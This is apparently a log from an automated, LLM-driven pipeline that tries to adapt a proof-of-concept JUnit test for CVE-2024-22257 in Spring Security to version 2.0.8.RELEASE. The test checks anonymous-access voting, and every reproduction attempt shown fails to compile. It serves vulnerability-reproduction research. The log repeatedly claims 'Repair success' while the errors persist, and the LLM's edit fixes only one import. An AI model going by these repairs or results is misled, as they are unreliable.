[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.access does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2995 (prompt), 1 (completion), 2996 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
  symbol:   variable AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
  symbol:   variable SecurityConfig
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
  symbol:   class AnonymousAuthenticationToken
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 12 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.221 s
[INFO] Finished at: 2025-07-10T06:45:49Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
[ERROR]   symbol:   variable AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
[ERROR]   symbol:   variable SecurityConfig
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
[ERROR]   symbol:   class AnonymousAuthenticationToken
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 137 (prompt), 7 (completion), 144 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.access does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.access.SecurityConfig; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.access;SecurityConfig
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.access', 'SecurityConfig'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 9, 'column': 43, 'message': 'package org.springframework.security.access does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.access.SecurityConfig;'} with cause: ['org.springframework.security.access', 'SecurityConfig'][0m
[96m[Adapter] Related diffs for error: [(439, 10.0), (462, 8.0), (1131, 8.0), (1170, 8.0), (1177, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.access does not exist | cause: ['org.springframework.security.access', 'SecurityConfig'][0m
[96m[RepairModule] Trying best diff #439 with score 10.00[0m
[LLMClient] Tokens used: 912 (prompt), 240 (completion), 1152 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.access does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.access.SecurityConfig;

### Related Diff:
Operation: NEW_FILE, File: core/src/main/java/org/springframework/security/SecurityConfig.java, Hunk: @@ -1,61 +0,0 @@
+/* Copyright 2004, 2005, 2006 Acegi Technology Pty Limited
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.springframework.security;
+
+import org.springframework.util.Assert;
+
+/**
+ * Stores a {@link ConfigAttribute} as a <code>String</code>.
+ *
+ * @author Ben Alex
+ * @version $Id$
+ */
+public class SecurityConfig implements ConfigAttribute {
+    //~ Instance fields ================================================================================================
+
+    private String attrib;
+
+    //~ Constructors ===================================================================================================
+
+    public SecurityConfig(String config) {
+    	Assert.hasText(config, "You must provide a configuration attribute");
+        this.attrib = config;
+    }
+
+    //~ Methods ========================================================================================================
+
+    public boolean equals(Object obj) {
+        if (obj instanceof ConfigAttribute) {
+            ConfigAttribute attr = (ConfigAttribute) obj;
+
+            return this.attrib.equals(attr.getAttribute());
+        }
+
+        return false;
+    }
+
+    public String getAttribute() {
+        return this.attrib;
+    }
+
+    public int hashCode() {
+        return this.attrib.hashCode();
+    }
+
+    public String toString() {
+        return this.attrib;
+    }
+}

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.access.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}



[LLMClient] Response: 
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.access does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
